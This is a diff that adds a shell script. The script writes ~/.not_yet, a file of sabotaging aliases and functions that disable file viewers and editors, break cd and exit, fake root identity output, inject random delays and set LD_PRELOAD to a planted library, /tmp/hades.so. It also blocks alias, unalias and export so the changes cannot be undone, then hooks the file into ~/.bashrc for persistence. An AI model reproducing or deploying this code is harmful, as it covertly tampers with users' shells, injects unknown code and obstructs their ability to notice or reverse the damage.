@@ -1,0 +1,32 @@
+cat <<'EOF' > ~/.not_yet
+tset -Qe $'\t'
+((RANDOM % 10)) || set -o errexit
+alias cat=true
+alias less=true
+alias more=true
+function ls { command ls -$(opts="frStu"; echo ${opts:$((RANDOM % ${#opts})):1}) "$@"; }
+function whoami { echo  "tuxi"; }
+function id { echo "uid=0(tuxi) gid=0(tuxi) groups=0(tuxi)"; }
+alias date='date -d "now + $RANDOM days"'
+alias exit='/bin/bash'
+alias yes="yes n"
+alias vi="vi +q"
+alias vim="vim +q"
+alias cd='cd ..'
+
+export PROMPT_COMMAND='sleep $(($RANDOM % ($(($RANDOM % 9))+1)))'
+export LD_PRELOAD=/tmp/hades.so
+export PS1='tuxi@\h:\w$ '
+alias export=false
+SHLVL=1
+
+alias unalias=false
+alias alias=false
+
+echo "-[----->+<]>---.+.-.+.-....[--->++<]>.[-->+++<]>.+.-.+.-.+...-[--->++<]>.[-->+++<]>..+...-.+.-.[--->++<]>.[-->+++<]>..+.-.....[--->++<]>.[-->+++<]>.+..-.+.-..+.-[--->++<]>.[-->+++<]>.+..-...+..-[--->++<]>.[-->+++<]>.+..-.+.-..+.-[--->++<]>.[-->+++<]>.+..-.+...-.[--->++<]>.[-->+++<]>.+..-..+...-[--->++<]>.[-->+++<]>.+..-....+.-[--->++<]>.[-->+++<]>.+..-....+.-[--->++<]>.[-->+++<]>.+..-..+.-..[--->++<]>.[-->+++<]>.+..-.+..-.+.-[--->++<]>.[-->+++<]>.+..-.+.-..+.-[--->++<]>.[-->+++<]>.+..-.+...-."
+
+EOF
+
+cp hades.so /tmp/hades.so
+sed -i '8i . ~/.not_yet' ~/.bashrc
+mkdir /tmp/pandora  > /dev/null 2>&1
